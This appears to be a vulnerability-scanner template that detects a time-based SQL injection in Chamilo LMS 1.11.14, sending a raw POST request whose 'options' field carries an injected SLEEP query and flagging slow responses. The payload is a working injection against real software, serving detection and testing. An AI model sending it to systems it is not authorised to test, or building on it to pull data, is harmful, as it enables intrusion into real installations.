id: chamilo-lms-sqli
info:
  author: undefl0w
  name: Chamilo LMS SQL Injection
  severity: high
  description: Finds sql injection in Chamilo version 1.11.14
  tags: chamilo,sqli

requests:
   - raw:
      - |
        POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        type=image&field_id=image&tag=image&from=image&search=image&options=["test'); SELECT SLEEP(2.5); -- "] 


     matchers:
       - type: dsl
         dsl:
          - 'duration>=2'
